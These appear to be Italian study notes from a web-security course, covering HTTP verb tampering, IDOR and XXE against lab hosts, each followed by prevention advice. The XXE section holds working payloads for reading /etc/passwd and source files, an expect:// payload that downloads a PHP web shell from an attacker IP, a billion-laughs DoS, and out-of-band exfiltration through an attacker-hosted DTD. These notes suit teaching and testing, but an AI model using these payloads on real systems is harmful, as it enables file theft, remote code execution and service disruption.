# Possibili attacchi generici ad una applicazione web

- **HTTP Verb Tampering**: invio di richieste malevole con metodi non previsti, che potrebbero baypassare i meccanismi di autenticazione dell'applicazione stessa.
- **Insecure Direct Object References (IDOR)**: una delle vulnerabilita' di applicazioni web piu' note e sfruttate. consiste nell'ottenere l'accesso a risorse che dovrebbero rimanere riservare o che cmq su cui l'attaccante non ha diritti. reso comune da una generica mancanza nelle applicazioni web di controllo degli accessi.
- **XML External Entity (XXE) Injection**: dato da falle nel processamento dei file XML. le falle possono essere bug delle librerie e/o misconfigurazioni delle stesse da parte degli sviluppatori.

## HTTP Verb Tempering

HTTP usa 9 verbi (HEAD, PUT, DELETE, OPTIONS, GET, POST, PATCH, CONNECT, TRACE). Di questi i piu' usati sono GET e POST. Una RESTAPI implementata correttamente utilizza per lo meno anche DELETE e PUT/PATCH. Spring usa dietro le quinte anche OPTIONS (per capire quali medoti sono disponibili per quel particolare endpoint).

Una configurazione insicura potrebbe essere dire qualcosa del tipo "Per usare GET e POST devi essere autenticato" il che e' verissimo ma ci si dimentica degli altri 7 metodi che risultano liberi in questo caso!

Anche una mitigazione ad una SQLInjection per esempio non deve essere fatta cosi:

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}

```

solo sulla GET ma deve tenere conto di qualunque verbo.

### Baypassare l'autenticazione con il verb tempering

E' abbastanza semplice provare metodi non previsti. Quindi iniziamo con identificare le eventuali vulnerabilita'.
Controllo dei metodi disponibili

```shell
$ curl -i -X OPTIONS http://138.68.166.146:31227/
```

possiamo provare a mandare ora una richiesta con i verbi permessi e vedere cosa succede.

### Baypassing security filters

### Prevenzione http verb tempering

Tenere conto di tutti i verbi, sia quando si genera la policy di sicurezza che quando si scrivono eventuali filtri.

Per evitare vulnerabilità di HTTP Verb Tampering nel nostro codice, dobbiamo essere coerenti con l'uso dei metodi HTTP e assicurarci che lo stesso metodo sia sempre utilizzato per qualsiasi funzionalità specifica nell'applicazione web. È sempre consigliabile ampliare l'ambito dei test nei filtri di sicurezza, verificando tutti i parametri della richiesta. Questo può essere fatto con le seguenti funzioni e variabili:

```shell
PHP 	$_REQUEST['param']
Java 	request.getParameter('param')
C# 	    Request['param']
```

## IDOR

Le vulnerabilità Insecure Direct Object References (IDOR) sono tra le vulnerabilità web più comuni e possono avere un impatto significativo sull'applicazione web vulnerabile. Le vulnerabilità IDOR si verificano quando un'applicazione web espone un riferimento diretto a un oggetto, come un file o una risorsa di database, che l'utente finale può controllare direttamente per ottenere l'accesso ad altri oggetti simili. Se qualsiasi utente può accedere a qualsiasi risorsa a causa della mancanza di un solido sistema di controllo degli accessi, il sistema è considerato vulnerabile.

Costruire un solido sistema di controllo degli accessi è molto impegnativo, per questo le vulnerabilità IDOR sono molto diffuse. Inoltre, anche automatizzare il processo di identificazione dei punti deboli nei sistemi di controllo degli accessi è piuttosto difficile, il che può portare a non identificare queste vulnerabilità finché non arrivano in produzione.

Ad esempio, se gli utenti richiedono l'accesso a un file che hanno caricato di recente, possono ricevere un link come (download.php?file_id=123). Quindi, dato che il link fa riferimento direttamente al file con (file_id=123), cosa succederebbe se tentassimo di accedere a un altro file (che potrebbe non appartenerci) con (download.php?file_id=124)? Se l'applicazione web non ha un sistema di controllo degli accessi adeguato sul back-end, potremmo essere in grado di accedere a qualsiasi file inviando una richiesta con il suo file_id. In molti casi, potremmo scoprire che l'id è facilmente indovinabile, rendendo possibile il recupero di molti file o risorse a cui non dovremmo avere accesso in base ai nostri permessi.

### Exploiting

Il primo passo e' l'identificazione degli oggetti direttamente refenziati.

Nei casi più elementari, possiamo provare a incrementare i valori dei riferimenti agli oggetti per recuperare altri dati, come (?uid=2) o (?filename=file_2.pdf). Si può anche usare un'applicazione di fuzzing per provare migliaia di varianti e vedere se restituiscono qualche dato. Qualsiasi risposta positiva a file che non sono nostri indicherebbe una vulnerabilità IDOR.

Le chiamate AJAX possono nascondere parametri che non dovrebbero esserci, rendendo vulnerabile l'applicazione alla IDOR. La funzione qui sotto potrebbe non essere mai chiamata quando si utilizza l'applicazione Web come utente non amministratore. Tuttavia, se la troviamo nel codice front-end, possiamo testarla in diversi modi per vedere se possiamo chiamarla per eseguire modifiche, il che indicherebbe che è vulnerabile a IDOR. Possiamo fare lo stesso con il codice di back-end se abbiamo accesso ad esso (ad esempio, applicazioni web open-source).

```js
function changeUserPassword() {
  $.ajax({
    url: "change_password.php",
    type: "post",
    dataType: "json",
    data: { uid: user.uid, password: user.password, is_admin: is_admin },
    success: function (result) {
      //
    },
  });
}
```

anche i nomi delle risorse, eventualmente mascherati dietro hash md5, magari hanno una struttura che li rende prevedibili.

### enumerazione delle risorse

```shell
$ curl -s "http://178.62.68.209:30080/documents.php" | grep 'href="/documents/'

curl -s "http://178.62.68.209:30080/documents.php" | grep -oP "\/documents.*?.pdf"

```

### enumerazione di nomi di risorse codificate

Potrebbe essere che il nome della risorsa sia codificata, anche se alla base e' un numero progressivo (e' questo che resta problematico!).
In questo caso stiamo generando i possibili nomi di risorse da 1 a 10, mimando questo comportamento `CryptoJS.MD5(btoa(uid)).toString()` emerso da una analisi del frontend. L'obiettivo e' generare possibili nomi di risorse che rispecchiano lo stesso schema.

```shell
$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

per un comportamneto `encodeURIComponent(btoa(uid))` usiamo invece

```shell
$ for i in {1..10}; do echo -n $i | base64 -w 0 | jq -sRr @uri; done
```

### IDOR in API non sicure (information disclosure)

In api non sicure e' possibile ottenere risorse a cui non si e' abilitati o che a bloccare e' solo il frontend. Per esempio su una GET del profilo utente

```shell
$ curl 'http://138.68.166.146:31119/profile/api.php/profile/1'
```

se non correttamente implementata si possono ottenere anche altri profili facendo una semplice enumerazione

### CHAIN DI IDOR

E' possibile sfruttare una o piu' vulnerabilita di tipo IDOR per ottenere l'accesso alle risorse volute.

In questa GET possiamo vedere che l'unica forma di autenticazione e' il cookie.

```shell
$ curl 'http://138.68.166.146:31119/profile/api.php/profile/1' -H 'Cookie: role=employee'
```

possiamo ottenere l'uuid di altri utenti e modificarli, usando nella richiesta il cookie necessario che non cambia in base all'utente! O anche inserire una Stored-XXS in qualche campo del profilo.

### Prevenzione

- Object-Level Access Control (RBAC)
  pezzo di codice in javascript che dimostra come fare un controllo degli accessi fatto bene

```js
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

- Object Referencing
  we should never use object references in clear text or simple patterns (e.g. uid=1). We should always use strong and unique references, like salted hashes or UUID's
  We must note that using UUIDs may let IDOR vulnerabilities go undetected since it makes it more challenging to test for IDOR vulnerabilities. This is why strong object referencing is always the second step after implementing a strong access control system.

## XXE

When the XML file is parsed on the server-side, in cases like SOAP (XML) APIs or web forms, then an entity can reference a file stored on the back-end server, which may eventually be disclosed to us when we reference the entity.

### Identificazione vulnerabilita'

Quando si inviano dati in formato XML e questi, tutti o in parte, vengono restituiti per la visualizzazione possiamo testare le XXE piu' agevolemnte. Esistono anche le injection blind ma le vediamo dopo.

Nel nostro esempio abbiamo il campo `email` che ci viene restiito. Proviamo ad inserire una entity e vediamo che la elabora correttamnte.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
<name>asdasd</name>
<tel>asdasd</tel>
<email>&company;</email>
<message>asdasd</message>
</root>
```

E' una conferma che stiamo dialogando con un server VULNERABILE alle XXE.

Nota che alcune applicazioni anche se dichiarano un contenttype json accettano acnhe altri formati. vale la pena cmq tentare: cambia il content type in application/xml e manda l'xml come payload della richiesta. puoi usare questo tool per convertire da json a xml https://www.convertjson.com/json-to-xml.htm

### Exploiting

il passo successivo, dovo aver scoperto la vulnerabilita', e' testare che siano accessibli informazioni riservate tipo `/etc/passwd`. Inviamo questo payload.

```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
<name>asdasd</name>
<tel>asdasd</tel>
<email>&company;</email>
<message>asdasd</message>
</root>

```

e vediamo che funziona! File interessanti da leggere tipicamente sono file di configurazione e chiavi ssh. Possiamo anche leggere il codice stesso dell'applicazione per comprendere e sfruttare meglio le eventuali vulnerabilita' (diventa un pen test withebox)

Proviamo a leggere `index.php`

```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///index.php">
]>
<root>
<name>asdasd</name>
<tel>asdasd</tel>
<email>&company;</email>
<message>asdasd</message>
</root>

```

cosi direttamente NON funziona perche' non e' un XML valido, va quindi codificato in base64

```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
<name>asdasd</name>
<tel>asdasd</tel>
<email>&company;</email>
<message>asdasd</message>
</root>

```

e riceviamo in risposta il file index.php codificato in base64. lo decodifichiamo con

```shell
base64 -d index.php.b64 > index.php
```

Chiaramente questo trucco funziona solo con applicazioni PHP!

Possiamo anche tentare una reverse shell, prima creandola ad hoc

```shell
$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
$ sudo python3 -m http.server 80

```

e poi inserendola nel doctype con OUR_IP corretto

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>

```

We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.

ESEMPIO DI DOS

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>

```

However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference.

### Exploiting con CDATA

finora abbiamo visto vulnerabilita' del DOCTYPE, vediamo come sfruttare il CDATA ora.
questo attacco puo' essere utile quando non stiamo parlando di applicazioni PHP e non riusciamo quindi a leggere file che non rispecchiano la struttura xml (non possiamo usare la codifica base64 quindi)

Il campo CDATA non ha bisogno di essere un XML valido!
Proviamo a creare una richiesta valida...

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
<root>
<name>asdasd</name>
<tel>asdasd</tel>
<email>&joined;</email>
<message>asdasd</message>
</root>
```

Questa qui cosi com'e' non funziona perche' XML prevents joining internal and external entities
Va usato anche il XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://10.10.15.253:8000/xxe.dtd">
  %xxe;
]>
<root>
<name>asdasd</name>
<tel>asdasd</tel>
<email>&joined;</email>
<message>asdasd</message>
</root>
```

e sul nostro computer dobbiamo creare un DTD locale con l'entity che ci interessa

```shell
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000
```

### error based

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.

NOTABENE limitazioni sulla lunghezza della risposta e su caratteri speciali

cmq si crea un dtd locale e lo si serve con python

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

poi si invia la richiesta all'endpoint giusto, che potrebbe essere diverso dal solito, ma che espone un errore non gestito. in questo caso e' `/error`

```shell
POST /error/submitDetails.php HTTP/1.1
Host: 10.129.7.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 111
Origin: http://10.129.7.130
Connection: close
Referer: http://10.129.7.130/error

<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://10.10.15.253:8000/xxe.dtd">
  %remote;
  %error;
]>
```

### Blind

simile all'attacco su errore, si basa sempre su un DTD esterno.

nella richiesta inviamo

```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://10.10.15.253:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>


```

sulla nostra macchina creiamo un file index.php

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

```

e un file xxe.dtd nella stessa cartella con questo contenuto, modificando il path del file che vogliamo leggere, in questo caso /etc/passwd

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.253:8000/?content=%file;'>">
```

e avviamo il server php

```shell
$ php -S 0.0.0.0:8000
```

inviata la richiesta, nella shell, come log del server php, possiamo leggere il file che ci interessa

### Prevenzione XXE

- aggiornare le librerie
- configurazione xml safe
  - Disable referencing custom Document Type Definitions (DTDs)
  - Disable referencing External XML Entities
  - Disable Parameter Entity processing
  - Disable support for XInclude
  - Prevent Entity Reference Loops

With the various issues and vulnerabilities introduced by XML data, many also recommend using other formats, such as JSON or YAML. This also includes avoiding API standards that rely on XML (e.g., SOAP) and using JSON-based APIs instead (e.g., REST).
